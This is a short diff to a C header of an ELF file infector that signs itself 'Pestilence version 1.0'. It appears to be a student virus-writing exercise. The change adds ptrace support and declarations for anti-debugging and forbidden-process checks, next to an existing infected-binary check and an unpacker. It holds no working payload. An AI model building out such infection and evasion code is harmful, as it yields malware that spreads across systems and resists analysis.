@@ -16,10 +16,13 @@
 # include <unistd.h>
 # include <string.h>
 # include <dirent.h>
+# include <sys/ptrace.h>
+
+# define TASK_COMM_LEN 16
 
 # define KEY_SIZE 64
 
-# define SIGNATURE ((char []){'P','e','s','t','i','l','e','n','c','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','v','s','t','e','f','f','e','n','\0'})
+# define SIGNATURE ((char []){'P','e','s','t','i','l','e','n','c','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','v','s','t','e','f','f','e','n','\n','\0'})
 
 # undef	 ELFMAG
 # define ELFMAG	(char []){0x7f, 'E','L','F'}
@@ -115,6 +118,10 @@ long	syscall_wrapper(long number, ...);
 
 // famine func
 bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last);
+
+// Pestilence func
+bool	check_forbidden_process(void);
+bool	check_debugging(void);
 
 
 # define BYTECODE_UNPACKER_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
